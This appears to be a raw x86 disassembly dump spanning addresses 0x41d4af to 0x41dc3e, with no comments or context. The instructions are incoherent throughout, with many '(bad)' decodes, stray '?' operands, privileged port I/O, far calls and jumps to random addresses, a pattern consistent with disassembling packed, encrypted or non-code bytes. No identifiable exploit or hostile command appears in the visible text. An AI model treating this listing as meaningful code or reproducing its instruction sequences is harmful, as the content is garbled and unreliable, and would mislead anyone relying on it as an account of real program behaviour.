  41d4af:	repnz push DWORD PTR [ecx+0x6ee86803]
  41d4b6:	int    0x95
  41d4b8:	dec    ecx
  41d4b9:	fcomp  DWORD PTR ds:0xfb38a2b1
  41d4bf:	pop    es
  41d4c0:	call   0xb70226be
  41d4c5:	adc    esp,DWORD PTR [ebx-0x21]
  41d4c8:	mov    DWORD PTR [ebp+0x64],ebp
  41d4cb:	push   esi
  41d4cc:	mov    esp,?
  41d4ce:	sub    al,0xa1
  41d4d0:	into   
  41d4d1:	jmp    0x54457f07
  41d4d6:	inc    esp
  41d4d7:	rol    DWORD PTR [ebp+0x58],1
  41d4da:	popf   
  41d4db:	xchg   esp,eax
  41d4dc:	xchg   edx,eax
  41d4dd:	inc    ebp
  41d4de:	pop    ecx
  41d4df:	xchg   esp,eax
  41d4e0:	fdivr  st(5),st
  41d4e2:	dec    ecx
  41d4e3:	rcr    bh,0x60
  41d4e6:	loopne 0x41d46b
  41d4e8:	sbb    eax,0xa6d2dc52
  41d4ed:	and    edi,DWORD PTR [esi]
  41d4ef:	xchg   esi,eax
  41d4f0:	adc    BYTE PTR [ebp+0x7e],ch
  41d4f3:	cmp    al,0xa2
  41d4f5:	pop    esi
  41d4f6:	ds push esp
  41d4f8:	inc    esi
  41d4f9:	pop    esp
  41d4fa:	pop    ebx
  41d4fb:	lock stc 
  41d4fd:	xchg   ecx,eax
  41d4fe:	mov    edi,0xcdaefd09
  41d503:	ss into 
  41d505:	ja     0x41d578
  41d507:	adc    dl,bh
  41d509:	sbb    BYTE PTR [esi],ah
  41d50b:	sub    al,BYTE PTR [eax+0x3de42dcb]
  41d511:	icebp  
  41d512:	fisttp WORD PTR [edi+0x42]
  41d515:	mul    BYTE PTR [ecx]
  41d517:	inc    BYTE PTR [ecx-0x2e15519e]
  41d51d:	aam    0x52
  41d51f:	sbb    ebp,DWORD PTR [edi-0x3262633]
  41d525:	jl     0x41d596
  41d527:	xor    eax,DWORD PTR [edi+esi*8+0xf]
  41d52b:	lods   eax,DWORD PTR ds:[esi]
  41d52c:	repnz in al,0x2a
  41d52f:	add    eax,0x3235e4ed
  41d534:	scas   eax,DWORD PTR es:[edi]
  41d535:	push   edx
  41d536:	pop    esp
  41d537:	popa   
  41d538:	(bad)  [ebp+0x3a19c0a5]
  41d53e:	cmp    cl,BYTE PTR [esi]
  41d540:	jge    0x41d50c
  41d542:	or     BYTE PTR [edi+0x5a185343],dl
  41d548:	mov    ebx,edx
  41d54a:	sbb    eax,0x3b1f35a1
  41d54f:	push   esi
  41d550:	ss dec eax
  41d552:	mov    edi,0x8285d39
  41d557:	mov    dl,0x5f
  41d559:	xor    al,0xd5
  41d55b:	je     0x41d576
  41d55d:	std    
  41d55e:	aam    0x70
  41d560:	imul   ecx,ebp,0x3a
  41d563:	(bad)  
  41d564:	stos   DWORD PTR es:[edi],eax
  41d565:	sub    eax,0xf321bf88
  41d56a:	hlt    
  41d56b:	data16 ja 0x41d5de
  41d56e:	cmp    eax,0xc8b9bee
  41d573:	daa    
  41d574:	repnz call 0x80fd:0x6477b47
  41d57c:	outs   dx,BYTE PTR ds:[esi]
  41d57d:	add    BYTE PTR ds:0x271aa599,bl
  41d583:	fst    QWORD PTR [esi-0x10]
  41d586:	add    al,0x14
  41d588:	ret    0x707c
  41d58b:	jno    0x41d607
  41d58d:	fmul   DWORD PTR [ebx-0x62c854c]
  41d593:	sbb    DWORD PTR [edx+0x835c1df],0x21056e06
  41d59d:	or     eax,0x2808616
  41d5a2:	ins    DWORD PTR es:[edi],dx
  41d5a3:	mov    dh,0x44
  41d5a5:	sbb    al,0x77
  41d5a7:	sub    DWORD PTR [edx+edx*8+0x57],ebx
  41d5ab:	add    DWORD PTR [edx+0x19dce88],esp
  41d5b1:	sbb    DWORD PTR [ebp-0x78764114],esi
  41d5b7:	xchg   esp,eax
  41d5b8:	inc    esi
  41d5b9:	loope  0x41d614
  41d5bb:	mov    ds:0xf49e66a5,eax
  41d5c0:	sbb    eax,0xd369b2f5
  41d5c5:	enter  0x22cd,0x9a
  41d5c9:	aas    
  41d5ca:	or     al,BYTE PTR [eax+0x765f95a7]
  41d5d0:	mov    esp,0x749b4847
  41d5d5:	ror    DWORD PTR [esi-0x68],cl
  41d5d8:	(bad)  
  41d5d9:	push   esi
  41d5da:	push   0xb86e6d55
  41d5df:	inc    edi
  41d5e0:	add    DWORD PTR [ebx+ebp*2+0x53da249d],ebp
  41d5e7:	add    al,0xbb
  41d5e9:	repnz fs stc 
  41d5ec:	fwait
  41d5ed:	sub    DWORD PTR [esp+edx*4+0x18],ebp
  41d5f1:	enter  0x90fa,0x92
  41d5f5:	add    BYTE PTR [eax],dl
  41d5f7:	test   eax,0x12f5dfde
  41d5fc:	xchg   BYTE PTR [edi],cl
  41d5fe:	sub    DWORD PTR [esp+ebx*1],ebx
  41d601:	add    dl,ah
  41d603:	fiadd  DWORD PTR [ecx]
  41d605:	xchg   DWORD PTR [ecx-0x672fbd40],edx
  41d60b:	fld    QWORD PTR [edi]
  41d60d:	iret   
  41d60e:	enter  0xa143,0xac
  41d612:	mov    ebp,0x2a83b860
  41d617:	push   ecx
  41d618:	call   0xa2aceb19
  41d61d:	adc    al,0x33
  41d61f:	mov    esi,0xfeb2c84
  41d624:	lea    esi,[ecx-0x5d]
  41d627:	ins    DWORD PTR es:[edi],dx
  41d628:	ucomiss xmm3,DWORD PTR [esi]
  41d62b:	pop    ecx
  41d62c:	pop    edi
  41d62d:	gs push 0x7e
  41d630:	push   ebx
  41d631:	imul   edx,ebx,0x7c
  41d634:	std    
  41d635:	push   0x57
  41d637:	mov    ds:0x968873d2,eax
  41d63c:	sbb    al,0xcc
  41d63e:	add    DWORD PTR [edx-0x289478bc],esp
  41d644:	pop    edx
  41d645:	xor    BYTE PTR [edx],ah
  41d647:	jecxz  0x41d686
  41d649:	push   0xffffffb9
  41d64b:	test   bl,al
  41d64d:	fwait
  41d64e:	mov    ds:0x4a2ef9de,al
  41d653:	mov    esi,0x8a9abc4c
  41d658:	aad    0x6b
  41d65a:	jne    0x41d631
  41d65c:	jecxz  0x41d6d5
  41d65e:	and    BYTE PTR [ebx-0x30],ah
  41d661:	cmc    
  41d662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d663:	mov    ds:0x16969,eax
  41d668:	xor    bh,BYTE PTR [ebp+0x61815b81]
  41d66e:	add    ecx,DWORD PTR cs:[eax]
  41d671:	inc    edx
  41d672:	daa    
  41d673:	rcl    bh,cl
  41d675:	sub    eax,0x6d8d06a3
  41d67a:	sbb    BYTE PTR [esp+edi*4],0x1f
  41d67e:	dec    ebp
  41d67f:	inc    esp
  41d680:	ret    
  41d681:	fs das 
  41d683:	scas   al,BYTE PTR es:[edi]
  41d684:	outs   dx,DWORD PTR ds:[esi]
  41d685:	sub    edi,DWORD PTR [edi]
  41d687:	adc    BYTE PTR [ebx-0x2e],ah
  41d68a:	ja     0x41d619
  41d68c:	inc    eax
  41d68d:	sbb    al,0x8b
  41d68f:	mov    ch,0x65
  41d691:	pop    edx
  41d692:	add    DWORD PTR [esi+0x76fbca25],ebx
  41d698:	cs retf 0x75ee
  41d69c:	push   0x1f
  41d69e:	xor    al,0x8d
  41d6a0:	inc    ebp
  41d6a1:	xor    ch,ah
  41d6a3:	push   0xffffffa5
  41d6a5:	mov    ch,dl
  41d6a7:	inc    ebp
  41d6a8:	xor    ch,BYTE PTR [ebx-0x4b82cc59]
  41d6ae:	pop    ss
  41d6af:	gs mov al,0x37
  41d6b2:	sub    DWORD PTR [esi],esi
  41d6b4:	cmp    ecx,DWORD PTR [ebx-0x4a199ecf]
  41d6ba:	leave  
  41d6bb:	inc    ebx
  41d6bc:	or     eax,0xc0890c37
  41d6c1:	mov    esp,0xb3a04ab1
  41d6c6:	out    0xd7,al
  41d6c8:	adc    ebx,DWORD PTR [edi]
  41d6ca:	ins    DWORD PTR es:[edi],dx
  41d6cb:	adc    esi,ebp
  41d6cd:	mov    WORD PTR [edi],ds
  41d6cf:	das    
  41d6d0:	inc    eax
  41d6d1:	or     al,0x10
  41d6d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6d4:	out    dx,al
  41d6d5:	or     al,ch
  41d6d7:	in     al,dx
  41d6d8:	mov    ds:0x62c52d49,eax
  41d6dd:	mov    bh,0xc1
  41d6df:	pop    ebp
  41d6e0:	cmp    edx,edi
  41d6e2:	mov    bh,ch
  41d6e4:	test   eax,0xca2a799c
  41d6e9:	sbb    eax,0x8a05baea
  41d6ee:	stos   BYTE PTR es:[edi],al
  41d6ef:	lods   al,BYTE PTR ds:[esi]
  41d6f0:	pop    ebp
  41d6f1:	popf   
  41d6f2:	repnz in eax,0x15
  41d6f5:	rcl    BYTE PTR [eax],0x65
  41d6f8:	push   cs
  41d6f9:	sub    dh,cl
  41d6fb:	js     0x41d6bb
  41d6fd:	pop    ebx
  41d6fe:	xchg   BYTE PTR ds:0xa91e982f,ah
  41d704:	mov    esi,0x2852b3a4
  41d709:	xlat   BYTE PTR ds:[ebx]
  41d70a:	sbb    al,BYTE PTR [ebx+0x5b84e7d4]
  41d710:	in     al,0xc7
  41d712:	test   DWORD PTR [edi+0x6d],0x5883a951
  41d719:	cdq    
  41d71a:	movlhps xmm1,xmm7
  41d71d:	push   edx
  41d71e:	pusha  
  41d71f:	mov    edx,0xfb2ccaa8
  41d724:	loopne 0x41d7a1
  41d726:	push   ebp
  41d727:	dec    eax
  41d728:	push   eax
  41d729:	out    0xc3,al
  41d72b:	and    al,0xf7
  41d72d:	mov    ds,WORD PTR [esi+0x7f]
  41d730:	int3   
  41d731:	inc    ebx
  41d732:	repnz hlt 
  41d734:	xchg   ebp,eax
  41d735:	or     dh,cl
  41d737:	enter  0x547f,0x77
  41d73b:	lahf   
  41d73c:	adc    ebp,DWORD PTR [edx]
  41d73e:	sbb    al,0xcd
  41d740:	into   
  41d741:	or     DWORD PTR [eax+edi*4],edi
  41d744:	lahf   
  41d745:	xor    al,0x60
  41d747:	xor    ebp,edx
  41d749:	data16 jbe 0x41d740
  41d74c:	cwde   
  41d74d:	icebp  
  41d74e:	(bad)  
  41d74f:	jge    0x41d6f7
  41d751:	sub    eax,0x61e7e895
  41d756:	pop    ebx
  41d757:	test   DWORD PTR [esi],eax
  41d759:	mov    eax,ds:0x4275bfca
  41d75e:	inc    esi
  41d75f:	inc    ebx
  41d760:	push   es
  41d761:	es jo  0x41d7a4
  41d764:	adc    al,al
  41d766:	daa    
  41d767:	aaa    
  41d768:	clc    
  41d769:	je     0x41d6f1
  41d76b:	and    DWORD PTR [eax-0x21735521],ebx
  41d771:	inc    esi
  41d772:	aad    0x77
  41d774:	xor    ecx,esp
  41d776:	hlt    
  41d777:	(bad)  
  41d778:	out    0x91,eax
  41d77a:	lock add BYTE PTR [eax+0x21],ah
  41d77e:	sahf   
  41d77f:	pop    ebp
  41d780:	adc    al,0xb6
  41d782:	aam    0x64
  41d784:	out    0x97,eax
  41d786:	mov    bl,0xd4
  41d788:	cmp    ebp,DWORD PTR [esp+ebx*1+0x5f]
  41d78c:	cmp    al,BYTE PTR ds:0x868b3958
  41d792:	dec    esp
  41d793:	and    DWORD PTR [ecx+0x8a1f3a],0x0
  41d79d:	add    BYTE PTR [eax],al
  41d79f:	add    BYTE PTR [eax],al
  41d7a1:	cld    
  41d7a2:	xlat   BYTE PTR ds:[ebx]
  41d7a3:	dec    esp
  41d7a4:	call   0xd83ed318
  41d7a9:	adc    BYTE PTR [ecx+0x628a13a2],ah
  41d7af:	scas   al,BYTE PTR es:[edi]
  41d7b0:	jmp    0x432b5b
  41d7b5:	scas   eax,DWORD PTR es:[edi]
  41d7b6:	add    eax,DWORD PTR [eax]
  41d7b8:	add    BYTE PTR [ebx+0x46],cl
  41d7bb:	loope  0x41d75f
  41d7bd:	pushf  
  41d7be:	xchg   ebx,eax
  41d7bf:	push   ds
  41d7c0:	jl     0x41d7b2
  41d7c2:	or     esi,DWORD PTR [edi+0x5b]
  41d7c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7c6:	clc    
  41d7c7:	stc    
  41d7c8:	repnz cmp esp,ebp
  41d7cb:	in     eax,0x32
  41d7cd:	or     eax,0xbaeb18f0
  41d7d2:	popa   
  41d7d3:	xchg   BYTE PTR [edi+0x194251d8],dl
  41d7d9:	add    al,0xe4
  41d7db:	xor    al,0x5c
  41d7dd:	add    DWORD PTR [ebx],edx
  41d7df:	mov    cl,0x37
  41d7e1:	mov    ah,0x77
  41d7e3:	mov    dh,BYTE PTR [edi]
  41d7e5:	sbb    al,0x83
  41d7e7:	repnz push ebp
  41d7e9:	in     eax,dx
  41d7ea:	mov    ?,WORD PTR [esi-0x31]
  41d7ed:	fadd   QWORD PTR [esi-0xc]
  41d7f0:	fs mov esp,0x413a23a7
  41d7f6:	in     al,0x0
  41d7f8:	fisttp WORD PTR [edi+ebp*8+0x3660dbbc]
  41d7ff:	inc    edi
  41d800:	popf   
  41d801:	jnp    0x41d7e1
  41d803:	mov    ds:0xf201d02d,eax
  41d808:	or     BYTE PTR [edx],al
  41d80a:	loope  0x41d885
  41d80c:	in     eax,dx
  41d80d:	mov    cl,0x9d
  41d80f:	enter  0xbec,0xfe
  41d813:	popf   
  41d814:	das    
  41d815:	sbb    al,0x24
  41d817:	stos   BYTE PTR es:[edi],al
  41d818:	gs push eax
  41d81a:	fwait
  41d81b:	add    BYTE PTR [edi+ebp*1+0x4df074fa],bl
  41d822:	pop    ecx
  41d823:	dec    ebx
  41d824:	add    DWORD PTR [edi+edx*4],edx
  41d827:	or     DWORD PTR [eax+0x2406b188],edi
  41d82d:	pop    ss
  41d82e:	in     al,0x9e
  41d830:	lods   al,BYTE PTR ds:[esi]
  41d831:	popa   
  41d832:	das    
  41d833:	mov    al,ds:0xf9ee3969
  41d838:	pop    ecx
  41d839:	fdiv   QWORD PTR [ebx+eax*1-0x4a05d5fa]
  41d840:	and    DWORD PTR [esi],edx
  41d842:	push   ebx
  41d843:	dec    esp
  41d844:	mov    ecx,0xe6426ad6
  41d849:	adc    al,0xdd
  41d84b:	jmp    0x41d7f8
  41d84d:	sbb    BYTE PTR [edx-0x289bd56f],dh
  41d853:	pop    ebp
  41d854:	push   0xc5da1f52
  41d859:	mov    BYTE PTR [eax],ah
  41d85b:	jne    0x41d7e0
  41d85d:	pop    edi
  41d85e:	(bad)  
  41d85f:	lea    eax,[edx]
  41d861:	aam    0xa1
  41d863:	jbe    0x41d861
  41d865:	dec    eax
  41d866:	mov    BYTE PTR [edi+0x6226b3f9],dl
  41d86c:	mov    ecx,0x4cf2933d
  41d871:	or     eax,0x8df8b17f
  41d876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d877:	cmp    BYTE PTR [ecx-0x36],bh
  41d87a:	popf   
  41d87b:	push   0xffffffae
  41d87d:	ror    cl,0x3d
  41d880:	call   0x343c56d9
  41d885:	pop    ebx
  41d886:	stc    
  41d887:	push   edx
  41d888:	push   eax
  41d889:	mov    ah,0x1d
  41d88b:	fnstsw WORD PTR [edi]
  41d88d:	push   esi
  41d88e:	stos   BYTE PTR es:[edi],al
  41d88f:	sub    BYTE PTR [ebp-0xa],dh
  41d892:	fisubr DWORD PTR ds:0xb4bbd635
  41d898:	lods   eax,DWORD PTR ds:[esi]
  41d899:	sub    eax,0x13bc1fb7
  41d89e:	nop
  41d89f:	sub    dl,dl
  41d8a1:	inc    esp
  41d8a2:	adc    al,0xf2
  41d8a4:	xor    DWORD PTR [eax+0x1ab203b5],edx
  41d8aa:	out    0xe7,al
  41d8ac:	out    0xc7,eax
  41d8ae:	out    0xaa,al
  41d8b0:	add    al,0x4
  41d8b2:	pop    ecx
  41d8b3:	in     eax,0xe
  41d8b5:	inc    edi
  41d8b6:	fisub  DWORD PTR [eax]
  41d8b8:	xlat   BYTE PTR ds:[ebx]
  41d8b9:	push   cs
  41d8ba:	mov    ebx,0x1f1cc69b
  41d8bf:	jmp    DWORD PTR [edx-0xe25eb23]
  41d8c5:	jg     0x41d918
  41d8c7:	popf   
  41d8c8:	loop   0x41d875
  41d8ca:	lea    eax,[ebx]
  41d8cc:	cmp    BYTE PTR ds:0x1133edf0,ch
  41d8d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8d4:	jmp    0x3a84:0x3ee93bee
  41d8db:	outs   dx,DWORD PTR ds:[esi]
  41d8dc:	iret   
  41d8dd:	inc    eax
  41d8de:	add    BYTE PTR [ebx+0x225d96e3],dl
  41d8e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8e5:	int    0x55
  41d8e7:	retf   
  41d8e8:	pop    ecx
  41d8e9:	mov    ebp,0x4b3bf186
  41d8ee:	adc    dl,al
  41d8f0:	leave  
  41d8f1:	jle    0x41d8c4
  41d8f3:	call   0xb11a:0xd6b046a
  41d8fa:	sub    eax,0x58e18725
  41d8ff:	out    0x58,eax
  41d901:	and    eax,0xb3436619
  41d906:	inc    eax
  41d907:	test   BYTE PTR [esi+ecx*1-0x4c5ec9e9],bh
  41d90e:	pop    es
  41d90f:	int    0x9a
  41d911:	lahf   
  41d912:	and    al,0x43
  41d914:	pop    es
  41d915:	xchg   edi,eax
  41d916:	jge    0x41d912
  41d918:	adc    eax,0xf13ab4
  41d91d:	mov    esi,0xe33d725
  41d922:	ja     0x41d8d9
  41d924:	cmp    DWORD PTR [ebx-0x6d],eax
  41d927:	arpl   WORD PTR [edx],si
  41d929:	aad    0x5
  41d92b:	imul   edx,ebx,0x91709b19
  41d931:	or     eax,0xffffffd0
  41d934:	into   
  41d935:	lods   eax,DWORD PTR ds:[esi]
  41d936:	push   eax
  41d937:	sbb    DWORD PTR [edx-0x5634c81a],ecx
  41d93d:	lahf   
  41d93e:	ins    DWORD PTR es:[edi],dx
  41d93f:	repz into 
  41d941:	mov    ch,BYTE PTR [edx+eiz*8-0xc]
  41d945:	std    
  41d946:	out    dx,eax
  41d947:	cmp    eax,DWORD PTR [ebx+0x1fa27d7d]
  41d94d:	(bad)  
  41d94e:	in     al,0xed
  41d950:	pop    ds
  41d951:	pop    esp
  41d952:	ret    
  41d953:	data16 jg 0x41d90b
  41d956:	mov    al,0x1f
  41d958:	jnp    0x41d8de
  41d95a:	enter  0x2bae,0xf2
  41d95e:	shl    BYTE PTR gs:[ebx-0x20],1
  41d962:	stos   BYTE PTR es:[edi],al
  41d963:	inc    esp
  41d964:	or     al,0xe
  41d966:	pop    edi
  41d967:	sbb    edx,DWORD PTR [ebx-0xd]
  41d96a:	mov    cl,0xb5
  41d96c:	xor    al,0xe0
  41d96e:	popf   
  41d96f:	xor    dh,BYTE PTR [edi+0x1f]
  41d972:	enter  0x9058,0x75
  41d976:	call   0x6188:0x9296275c
  41d97d:	fdiv   DWORD PTR [edi+ecx*2+0x41]
  41d981:	mov    esi,DWORD PTR [edx+0x51fe8af7]
  41d987:	mov    ds:0x8eca6a93,eax
  41d98c:	add    edx,edx
  41d98e:	(bad)  
  41d98f:	scas   eax,DWORD PTR es:[edi]
  41d990:	dec    ecx
  41d991:	jo     0x41d947
  41d993:	pop    ebx
  41d994:	push   ebx
  41d995:	mov    bl,0xb8
  41d997:	or     cl,bl
  41d999:	mov    edi,0x2929c95
  41d99e:	dec    esp
  41d99f:	call   0xcc16:0x7512457
  41d9a6:	mov    ch,0x7
  41d9a8:	mov    ds:0x60af8368,eax
  41d9ad:	mov    edx,0xe1e5bfc7
  41d9b2:	in     eax,0xab
  41d9b4:	cwde   
  41d9b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9b6:	xchg   edx,eax
  41d9b7:	sub    ah,BYTE PTR [ecx+0x3c]
  41d9ba:	xchg   esi,eax
  41d9bb:	mov    ss,WORD PTR [ebp+0x70]
  41d9be:	(bad)  [esi]
  41d9c0:	arpl   WORD PTR [ebp-0x78d5722b],si
  41d9c6:	push   es
  41d9c7:	mov    BYTE PTR [ebp+0x3c],ah
  41d9ca:	repnz call 0x7989:0xd427bc52
  41d9d2:	sub    ebp,esi
  41d9d4:	add    BYTE PTR [ebx-0x4ffb4d1a],dh
  41d9da:	xchg   esp,eax
  41d9db:	mov    esp,0xe8981eb5
  41d9e0:	push   ebp
  41d9e1:	mov    ebx,0x532da7bf
  41d9e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9e7:	pop    ss
  41d9e8:	push   esp
  41d9e9:	sub    ecx,esp
  41d9eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9ed:	das    
  41d9ee:	lods   eax,DWORD PTR ds:[esi]
  41d9ef:	mov    ecx,0xea4047ab
  41d9f4:	out    0xa5,al
  41d9f6:	add    edx,ebp
  41d9f8:	sub    eax,0x7a8aeec4
  41d9fd:	ficom  DWORD PTR [ebx]
  41d9ff:	popf   
  41da00:	ds dec eax
  41da02:	imul   ecx,ebp,0xa5fda16b
  41da08:	inc    eax
  41da09:	paddb  mm1,mm7
  41da0c:	ins    BYTE PTR es:[edi],dx
  41da0d:	rcl    ebp,cl
  41da0f:	ss mov ah,0x9c
  41da12:	mov    edx,DWORD PTR [ebx]
  41da14:	shl    BYTE PTR [ebp+0x22],0x59
  41da18:	adc    eax,0xa253618a
  41da1d:	adc    dh,ch
  41da1f:	retf   0xed97
  41da22:	pop    ss
  41da23:	mov    esi,0xa07d8c38
  41da28:	xchg   ebx,eax
  41da29:	ins    DWORD PTR es:[edi],dx
  41da2a:	adc    DWORD PTR [eax-0x60],ebx
  41da2d:	scas   al,BYTE PTR es:[edi]
  41da2e:	int    0xb8
  41da30:	pop    ss
  41da31:	jmp    0x41da68
  41da33:	mov    ch,0x52
  41da35:	sar    BYTE PTR [esi],cl
  41da37:	pop    ecx
  41da38:	add    edi,DWORD PTR [esi]
  41da3a:	jge    0x41d9be
  41da3c:	movq   QWORD PTR [esp+edx*8],mm0
  41da40:	jge    0x41daa3
  41da42:	or     eax,0x97044cb1
  41da47:	jne    0x41da93
  41da49:	test   DWORD PTR [eax-0x2b],0x771b7f13
  41da50:	sahf   
  41da51:	jne    0x41d9d5
  41da53:	(bad)  
  41da54:	out    0xa4,eax
  41da56:	sub    BYTE PTR [ecx+0x152ab851],bh
  41da5c:	repnz pop edi
  41da5e:	mov    al,0xb2
  41da60:	repnz in al,0x68
  41da63:	les    ecx,FWORD PTR [edi-0x16]
  41da66:	or     WORD PTR [edi+ebp*8+0x239d540d],0x47
  41da6f:	mov    bl,0x7e
  41da71:	retf   
  41da72:	xchg   edi,eax
  41da73:	int3   
  41da74:	out    dx,eax
  41da75:	loop   0x41da32
  41da77:	push   0xffffffd9
  41da79:	fucomip st,st(0)
  41da7b:	repz ss pop edi
  41da7e:	cmp    esp,DWORD PTR [esp+ecx*8-0x76]
  41da82:	push   edx
  41da83:	inc    esi
  41da84:	cmp    ecx,DWORD PTR [esi-0x15adbe4e]
  41da8a:	sbb    ebp,DWORD PTR [ebx-0x5f3728a3]
  41da90:	jge    0x41da2e
  41da92:	enter  0xe719,0xb4
  41da96:	jge    0x41da66
  41da98:	xor    BYTE PTR [ebp+0x5cc48d84],dh
  41da9e:	inc    esp
  41da9f:	jmp    0x7894:0x7f554792
  41daa6:	sub    ecx,DWORD PTR gs:[ecx-0x6f]
  41daaa:	or     dh,BYTE PTR [ebx-0x62]
  41daad:	lods   eax,DWORD PTR ds:[esi]
  41daae:	jecxz  0x41da79
  41dab0:	leave  
  41dab1:	push   eax
  41dab2:	inc    esp
  41dab3:	(bad)  
  41dab4:	stc    
  41dab5:	and    bl,BYTE PTR [edi]
  41dab7:	pop    ss
  41dab8:	nop
  41dab9:	iret   
  41daba:	(bad)  
  41dabb:	push   esi
  41dabc:	std    
  41dabd:	out    dx,eax
  41dabe:	pop    ebx
  41dabf:	outs   dx,DWORD PTR ds:[esi]
  41dac0:	mov    eax,0xe7dbbc4c
  41dac5:	mov    bl,0xc3
  41dac7:	iret   
  41dac8:	(bad)  
  41dac9:	mov    bh,0xaa
  41dacb:	cmp    BYTE PTR [edi-0x1bd313d1],bh
  41dad1:	push   es
  41dad2:	dec    ebx
  41dad3:	mov    edx,0x6a550153
  41dad8:	lock dec ebx
  41dada:	mov    edi,0x7c0f400
  41dadf:	loop   0x41da95
  41dae1:	dec    edx
  41dae2:	jle    0x41da9e
  41dae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dae5:	clc    
  41dae6:	fiadd  WORD PTR [ebx-0x67]
  41dae9:	sbb    al,0xe5
  41daeb:	jl     0x41dacf
  41daed:	in     al,0x76
  41daef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daf0:	hlt    
  41daf1:	adc    al,ah
  41daf3:	adc    BYTE PTR [ecx-0x60],ah
  41daf6:	push   edx
  41daf7:	mov    bh,0xf1
  41daf9:	xchg   edx,eax
  41dafa:	(bad)  
  41dafb:	adc    eax,DWORD PTR [eax-0x4babed5d]
  41db01:	pop    esp
  41db02:	es inc esp
  41db04:	icebp  
  41db05:	(bad)  
  41db06:	mov    dl,BYTE PTR ss:[eax-0x27]
  41db0a:	push   es
  41db0b:	fcomi  st,st(4)
  41db0d:	jns    0x41da9f
  41db0f:	popf   
  41db10:	mov    cl,0xfa
  41db12:	inc    edx
  41db13:	ds inc esp
  41db15:	dec    esi
  41db16:	add    eax,0x576ebcca
  41db1b:	sbb    eax,0xc2378513
  41db20:	push   es
  41db21:	or     al,0x77
  41db23:	xor    eax,edi
  41db25:	ins    DWORD PTR es:[edi],dx
  41db26:	je     0x41db13
  41db28:	xchg   ebp,eax
  41db29:	leave  
  41db2a:	push   esi
  41db2b:	inc    eax
  41db2c:	sbb    ebx,DWORD PTR [ebx]
  41db2e:	push   ebx
  41db2f:	pop    es
  41db30:	mov    ds:0xca84a004,al
  41db35:	xor    al,BYTE PTR [eax-0x6cc1b83b]
  41db3b:	in     eax,0x9d
  41db3d:	ror    DWORD PTR [ebp+edx*1+0x67],1
  41db41:	and    DWORD PTR [edi+ebx*4+0x33],0xdb13e6dd
  41db49:	sbb    eax,eax
  41db4b:	jge    0x41dba0
  41db4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db4e:	jmp    0x41db1b
  41db50:	pop    ebp
  41db51:	push   ebp
  41db52:	aad    0x8a
  41db54:	fst    DWORD PTR [ecx-0x335eebf5]
  41db5a:	sub    ebp,DWORD PTR [eax]
  41db5c:	out    dx,al
  41db5d:	sub    eax,0xfa35dda6
  41db62:	mov    edx,0xf60e6f00
  41db67:	dec    eax
	...
  41db70:	add    BYTE PTR [ecx-0x11],al
  41db73:	jnp    0x41dba3
  41db75:	(bad)  
  41db76:	mov    esi,0x1adaef55
  41db7b:	cmp    eax,0x89fe0c62
  41db80:	xor    BYTE PTR [ebp+0x57],dl
  41db83:	add    DWORD PTR [eax],eax
  41db85:	scas   eax,DWORD PTR es:[edi]
  41db86:	add    eax,DWORD PTR [eax]
  41db88:	add    BYTE PTR [ebx+eax*8],al
  41db8b:	cld    
  41db8c:	mov    ebx,0xe4a90605
  41db92:	imul   eax,DWORD PTR [edi],0x1e586c3d
  41db98:	int3   
  41db99:	cs pushf 
  41db9b:	imul   ebx,DWORD PTR [edx-0x59b90ab5],0xafa2eae2
  41dba5:	dec    ecx
  41dba6:	xor    eax,0xc7443c79
  41dbab:	mov    bl,0x39
  41dbad:	jns    0x41db7f
  41dbaf:	(bad)  
  41dbb0:	(bad)  
  41dbb1:	in     eax,0x88
  41dbb3:	push   ebx
  41dbb4:	test   BYTE PTR [ebp+0x6fc42352],dl
  41dbba:	arpl   sp,sp
  41dbbc:	xor    al,0xd4
  41dbbe:	stos   DWORD PTR es:[edi],eax
  41dbbf:	into   
  41dbc0:	mov    al,ds:0xa5721735
  41dbc5:	retf   
  41dbc6:	inc    edx
  41dbc7:	es mov ?,ebx
  41dbca:	or     eax,0x9029224d
  41dbcf:	add    eax,0xd72089c2
  41dbd4:	mov    ds:0x2b563650,eax
  41dbd9:	push   cs
  41dbda:	push   ecx
  41dbdb:	dec    ecx
  41dbdc:	add    eax,0xed7820b2
  41dbe1:	xchg   DWORD PTR [ebp-0x10ae4fa9],ebx
  41dbe7:	or     eax,0x6cd13e8a
  41dbec:	mov    dh,0x57
  41dbee:	stc    
  41dbef:	out    dx,eax
  41dbf0:	(bad)  
  41dbf1:	cld    
  41dbf2:	lock jmp 0x17d5:0xab58b98d
  41dbfa:	xchg   esi,eax
  41dbfb:	xchg   ebp,eax
  41dbfc:	inc    edx
  41dbfd:	mov    edi,0xc8a9ede1
  41dc03:	or     eax,DWORD PTR [edx-0x61]
  41dc06:	fxam   
  41dc08:	and    eax,0xf3113d65
  41dc0d:	aam    0x7c
  41dc0f:	pop    es
  41dc10:	out    0x42,eax
  41dc12:	ds pop ecx
  41dc14:	push   edi
  41dc15:	xor    ebp,DWORD PTR [ebp-0x1a]
  41dc18:	mov    eax,0x4e5f4942
  41dc1d:	out    dx,eax
  41dc1e:	jbe    0x41dc37
  41dc20:	ins    DWORD PTR es:[edi],dx
  41dc21:	sbb    BYTE PTR [edx+0x0],0x58
  41dc25:	push   edx
  41dc26:	scas   al,BYTE PTR es:[edi]
  41dc27:	xor    BYTE PTR [eax+0x3d7e75a],ah
  41dc2d:	cmp    eax,0x125852c
  41dc32:	stos   DWORD PTR es:[edi],eax
  41dc33:	stos   DWORD PTR es:[edi],eax
  41dc34:	and    ebp,DWORD PTR [esp+eax*8-0x6c]
  41dc38:	idiv   BYTE PTR [esi-0x64c4350f]
  41dc3e:	sbb    al,0x8
